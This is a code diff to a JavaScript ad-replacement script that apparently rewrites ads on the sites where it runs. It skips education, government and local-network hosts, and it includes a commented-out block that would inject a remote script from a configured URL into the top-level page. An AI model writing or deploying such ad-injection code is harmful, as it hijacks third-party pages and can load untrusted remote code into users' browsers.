@@ -1,6 +1,7 @@
 import { phone } from 'ismobilejs';
 import { mobileExtend, PCExtend } from './utils';
 import { mobileReplace, PCReplace } from './replace';
+import { AD_0X0 } from './config';
 
 const [name, version] = ['replace-extends-js', '1.0.0'];
 const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
@@ -21,7 +22,7 @@ function extend() {
 }
 
 function replace() {
-  if (window.adReplaceJS || blackWebsite.test(hostname)) return;
+  if (blackWebsite.test(hostname)) return;
   window.adReplaceJS = `${name}-${version}`;
   if (phone) mobileReplace();
   else PCReplace();
@@ -105,10 +106,13 @@ setInterval(() => {
 }, 3000);
 
 setTimeout(() => {
-  if (hostname) {
-    extend();
-    replace();
-  }
+  if (hostname) replace();
+  // if (phone) {
+  //   // 唤醒广告位
+  //   const scr = document.createElement('script');
+  //   scr.src = AD_0X0;
+  //   window.top.document.body.appendChild(scr);
+  // }
 }, 2000);
 setTimeout(() => {
   if (hostname) replace();
